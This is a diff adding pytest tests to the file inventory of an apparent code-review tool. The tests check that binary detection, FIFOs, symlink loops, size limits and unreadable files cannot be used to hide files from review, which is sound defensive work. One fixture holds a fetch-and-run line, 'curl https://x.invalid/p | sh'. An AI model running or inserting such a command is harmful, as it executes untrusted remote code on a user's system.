@@ -238,10 +238,127 @@ def test_excluded_directories_are_reported_not_dropped(tmp_path: Path) -> None:
 
 
 def test_binary_files_are_inventoried_but_not_hashed_as_text(tmp_path: Path) -> None:
-    """NUL in the first 8 KiB, never the extension (STACK.md §5)."""
+    """Content, never the extension (STACK.md §5).
+
+    The docstring said "NUL in the first 8 KiB" until M3.5. That stopped being
+    the rule, and a comment describing a rule the code no longer has is the F1
+    shape — it reads as a specification and is checked by nobody.
+    """
     root = build_tree(tmp_path / "tree")
     logo = next(entry for entry in inventory.walk(root) if entry.path == "logo.png")
     assert logo.is_binary
+
+
+# --- M3.5 A3: one byte must not decide whether a file is reviewed ---------
+
+
+def test_one_nul_in_a_comment_does_not_make_a_script_binary() -> None:
+    """A3. Under the old rule a single NUL anywhere in the first 8 KiB marked
+    the file binary, and binary means "not swept and not read by the surface
+    source" — so a target hid an entire file from review with one byte.
+
+    P11 says detection must not decide scope. A byte chosen by the target
+    decided it, and the review then reported nothing found there rather than
+    reporting that it had not looked.
+    """
+    script = b"#!/bin/sh\n# fetch and run\x00\ncurl https://x.invalid/p | sh\n"
+    assert not inventory.is_binary(script)
+
+
+def test_a_real_binary_is_still_binary() -> None:
+    """The other half. Loosening the rule must not start sweeping PNGs:
+    matching regexes against decoded binary produces hits that mean nothing."""
+    assert inventory.is_binary(b"\x89PNG\r\n\x1a\n" + bytes(64))
+
+
+def test_the_threshold_is_the_one_stack_md_states() -> None:
+    """`STACK.md` §5 fixes it at *exceeding* 5% of the first 8 KiB, and the
+    boundary is asserted rather than left to the next reader to infer.
+
+    Exactly 5% is text. A threshold written as "5%" and implemented as `>=`
+    would silently move the line, and every real text file in the fixture tree
+    measures 0.00%, so nothing else in the suite would ever notice.
+    """
+    assert not inventory.is_binary(b"x" * 95 + b"\x00" * 5)
+    assert inventory.is_binary(b"x" * 93 + b"\x00" * 7)
+
+
+def test_ordinary_whitespace_is_not_evidence_of_a_binary() -> None:
+    """Tab, CR, LF, vertical tab, form feed and escape are C0 controls that
+    appear in real text — a CRLF file full of tabs is not binary, and a rule
+    counting every control byte would call it one."""
+    assert not inventory.is_binary(b"\t\r\n\v\f\x1b" * 200)
+
+
+# --- M3.5 C1: a target must not be able to stop the review ----------------
+
+
+def test_a_fifo_does_not_block_the_walk(tmp_path: Path) -> None:
+    """C1. `_file_entry` called `read_bytes()`, and opening a FIFO with no
+    writer blocks *forever* — nothing raised, nothing timed out, so -002's
+    `except OSError` could never reach it. One named pipe hung the review
+    indefinitely, and unlike every other finding here it fails silently: no
+    error, no output, just a review that never finishes.
+
+    **This assertion could not exist before the fix.** Run red it would have
+    hung pytest itself, with no timeout to rescue it. The reproduction was done
+    in a bounded scratchpad probe instead — `inventory.walk` on a daemon thread
+    with a deadline, abandoned if it never returned — and the suite gets a test
+    only now that completion is guaranteed.
+
+    Built at runtime and skipped where the filesystem refuses one: a FIFO
+    cannot be committed to git (`BRIEF_M3.5.md` §3).
+    """
+    root = build_tree(tmp_path / "tree")
+    try:
+        os.mkfifo(root / "pipe")
+    except (AttributeError, OSError):  # pragma: no cover - platform-dependent
+        pytest.skip("this platform or filesystem does not support FIFOs")
+
+    by_path = {entry.path: entry for entry in inventory.walk(root)}
+
+    assert by_path["pipe"].is_regular is False
+    assert by_path["pipe"].sha256 is None
+    # Recorded as a different fact from an unreadable file, which is why this
+    # got its own field: nothing denied us the pipe, it simply has no content
+    # to review. Folding the two together would tell a reviewer that a
+    # permission they might be able to change was the problem.
+    assert by_path["pipe"].is_readable is True
+    # And the rest of the tree is still walked.
+    assert by_path["pkg/app.py"].is_regular is True
+    assert by_path["pkg/app.py"].sha256 is not None
+
+
+def test_a_file_over_the_size_bound_is_recorded_and_not_read(tmp_path: Path) -> None:
+    """`STACK.md` §5's file-size bound, at the level where it is applied.
+
+    The bound is lowered rather than a 5 MiB fixture written: the code path is
+    identical and the default is exercised implicitly by every other test in
+    this suite.
+    """
+    root = build_tree(tmp_path / "tree")
+    big = root / "pkg" / "big.py"
+    big.write_text("x = 1\n" * 100, encoding="utf-8")
+
+    by_path = {entry.path: entry for entry in inventory.walk(root, max_bytes=200)}
+    entry = by_path["pkg/big.py"]
+
+    assert entry.is_within_size_bound is False
+    # `size` is real and `sha256` is None, and that pairing is the point: the
+    # size came from `lstat`, which opens nothing, while the hash is absent
+    # because the bytes were never seen. It is the evidence that the bound was
+    # applied *before* the read rather than wrapped around it — which is the
+    # difference between costing a stat and costing however long the read took.
+    assert entry.size == big.stat().st_size
+    assert entry.sha256 is None
+
+    # A third distinct fact, not a variant of the other two.
+    assert entry.is_readable is True
+    assert entry.is_regular is True
+
+    # And nothing smaller is affected.
+    assert by_path["pkg/app.py"].is_within_size_bound is True
+    assert by_path["pkg/app.py"].sha256 is not None
 
 
 def test_symlinks_are_recorded_and_never_followed(tmp_path: Path) -> None:
@@ -275,3 +392,108 @@ def test_walk_refuses_a_root_that_is_not_a_directory(tmp_path: Path, missing: st
     build_tree(tmp_path / "tree")
     with pytest.raises((NotADirectoryError, FileNotFoundError)):
         inventory.walk(tmp_path / "tree" / missing)
+
+
+# --- M3.5 group C: one bad file does not end the review -------------------
+#
+# Both fixtures are built at runtime and skipped where the filesystem refuses
+# them, the precedent set above by the normalisation-collision test: a symlink
+# loop and a mode-000 file cannot be committed to git, and a fixture whose
+# shape depends on the filesystem cannot pin a rule.
+
+
+def test_a_symlink_loop_does_not_end_the_walk(tmp_path: Path) -> None:
+    """C2. `Path.resolve()` raises `RuntimeError` on a loop, and `_escapes`
+    caught only `OSError` — so the exception travelled all the way to
+    `cli._run`'s generic handler and became exit 3, reporting a fact about the
+    target as a bug in the tool.
+
+    Checked against the interpreter rather than taken from the review: on
+    CPython 3.12 the loop raises `RuntimeError("Symlink loop from ...")`, and
+    `isinstance(that, OSError)` is `False`. The two are unrelated branches of
+    the hierarchy, so no widening of `OSError` would ever have caught it.
+
+    The polarity is deliberately unchanged: an unresolvable link is recorded as
+    leaving the tree. Treating "I cannot resolve this" as a question rather
+    than as silence is the same choice `_escapes` already made for `OSError`
+    (P9), and the alternative — assuming it stays inside — would be a guess in
+    the direction that produces no candidate.
+    """
+    root = build_tree(tmp_path / "tree")
+    try:
+        (root / "loop-a").symlink_to(root / "loop-b")
+        (root / "loop-b").symlink_to(root / "loop-a")
+    except OSError:  # pragma: no cover - filesystem-dependent
+        pytest.skip("filesystem does not support symlinks")
+
+    by_path = {entry.path: entry for entry in inventory.walk(root)}
+
+    assert by_path["loop-a"].is_symlink
+    assert by_path["loop-a"].escapes_root
+    # The rest of the tree is still walked, which is the half of this that a
+    # bare "does not raise" assertion would miss.
+    assert by_path["pkg/app.py"].sha256 is not None
+    assert len(by_path) > 3
+
+
+def test_an_unreadable_file_does_not_end_the_walk(tmp_path: Path) -> None:
+    """C2's other half. `_file_entry` calls `read_bytes()`, so one mode-000
+    file raised `PermissionError` out of `walk()` and ended the review of every
+    other file in the target — a target can therefore hide the whole tree
+    behind one unreadable file.
+
+    It is recorded rather than skipped. "I did not read this file" and "I read
+    it and found nothing" are different states, and collapsing them is the H-1
+    failure this project exists to notice, applied to the tool instead of to
+    the harness.
+    """
+    root = build_tree(tmp_path / "tree")
+    blocked = root / "pkg" / "locked.py"
+    blocked.write_text("result = eval(x)\n", encoding="utf-8")
+    blocked.chmod(0o000)
+
+    try:
+        blocked.read_bytes()
+    except PermissionError:
+        pass
+    else:  # pragma: no cover - running as root ignores the mode
+        blocked.chmod(0o644)
+        pytest.skip("this user ignores file modes, so the file is not unreadable")
+
+    try:
+        by_path = {entry.path: entry for entry in inventory.walk(root)}
+    finally:
+        blocked.chmod(0o644)
+
+    assert by_path["pkg/locked.py"].is_readable is False
+    # No hash, because nothing was read. A hash here would be a claim about
+    # bytes nobody saw.
+    assert by_path["pkg/locked.py"].sha256 is None
+    assert by_path["pkg/app.py"].is_readable is True
+    assert by_path["pkg/app.py"].sha256 is not None
+
+
+def test_an_unreadable_file_is_not_silently_absent(tmp_path: Path) -> None:
+    """The test of the test. Skipping the file entirely would also stop the
+    walk from raising, and every assertion above except the `is_readable` one
+    would still pass — so this pins that the entry is present at all."""
+    root = build_tree(tmp_path / "tree")
+    before = {entry.path for entry in inventory.walk(root)}
+
+    blocked = root / "pkg" / "locked.py"
+    blocked.write_text("result = eval(x)\n", encoding="utf-8")
+    blocked.chmod(0o000)
+    try:
+        blocked.read_bytes()
+    except PermissionError:
+        pass
+    else:  # pragma: no cover - running as root ignores the mode
+        blocked.chmod(0o644)
+        pytest.skip("this user ignores file modes, so the file is not unreadable")
+
+    try:
+        after = {entry.path for entry in inventory.walk(root)}
+    finally:
+        blocked.chmod(0o644)
+
+    assert after - before == {"pkg/locked.py"}
